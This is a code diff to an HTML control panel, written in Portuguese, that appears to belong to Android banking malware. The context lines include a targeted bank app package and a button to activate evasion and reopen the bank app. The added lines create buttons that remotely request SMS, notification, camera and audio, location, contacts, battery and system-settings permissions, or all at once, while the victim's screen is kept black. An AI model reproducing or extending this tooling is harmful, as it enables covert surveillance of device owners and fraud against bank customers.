@@ -173,6 +173,10 @@ body.semAside aside{display:none}
 <div class=ln><input id=bpkg value="br.com.intermedium" placeholder="pacote do banco"></div>
 <div class=ln><button class=pri onclick="bankOn()">Ativar evasão e reabrir banco</button><button onclick="c('unbank')">Restaurar</button></div>
 <pre id=bankout></pre>
+<div class="ln leg" style="margin-top:10px">permissões remotas (funcionam com a tela preta, use a aba árvore para confirmar)</div>
+<div class=ln><button onclick="c('perm')">Abrir setup</button><button onclick="c('pedir',{s:'sms'})">Mensagens</button><button onclick="c('notiflist')">Notificações</button></div>
+<div class=ln><button onclick="c('pedir',{s:'camera'})">Câmera e áudio</button><button onclick="c('pedir',{s:'loc'})">Localização</button><button onclick="c('pedir',{s:'contatos'})">Contatos</button></div>
+<div class=ln><button onclick="c('battery')">Bateria</button><button onclick="c('wr')">Ajustes do sistema</button><button onclick="c('pedir',{s:'tudo'})">Tudo</button></div>
 </div>
 <div id=v-cfg style=display:none>
 <div class=ln title="Qualidade do JPEG">Qualidade <input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
